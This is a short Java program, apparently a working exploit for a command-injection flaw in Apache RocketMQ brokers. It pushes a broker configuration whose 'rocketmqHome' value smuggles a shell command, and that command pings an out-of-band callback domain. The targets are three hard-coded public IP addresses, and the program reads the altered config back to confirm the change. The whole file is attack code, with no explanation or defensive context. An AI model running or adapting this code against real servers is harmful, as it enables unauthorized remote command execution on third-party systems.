package org.example;

import org.apache.rocketmq.tools.admin.DefaultMQAdminExt;
import java.util.Properties;

public class Main {
    public static void main(String[] args) throws Exception {
        String[] urls = {"47.242.245.238/#/","120.76.177.232:8899/","120.76.196.24:8180/"};
        for (int i = 0; i < urls.length; i++) {
            updateConfig(urls[i]);
        }

    }

    public static void updateConfig(String url) throws Exception {
        Properties props = new Properties();
        props.setProperty("rocketmqHome","-c $@|sh . echo ping chr17sz2vtc0000ymdaggehyuhhyyyyyb.oast.fun;");
        props.setProperty("filterServerNums","1");
        // 创建 DefaultMQAdminExt 对象并启动
        DefaultMQAdminExt admin = new DefaultMQAdminExt();
        admin.setNamesrvAddr("localhost:9876");
        admin.start();
        // 更新配置⽂件
        admin.updateBrokerConfig(url, props);
        Properties brokerConfig = admin.getBrokerConfig(url);
        System.out.println(brokerConfig.getProperty("rocketmqHome"));
        System.out.println(brokerConfig.getProperty("filterServerNums"));
        // 关闭 DefaultMQAdminExt 对象
        admin.shutdown();
    }
}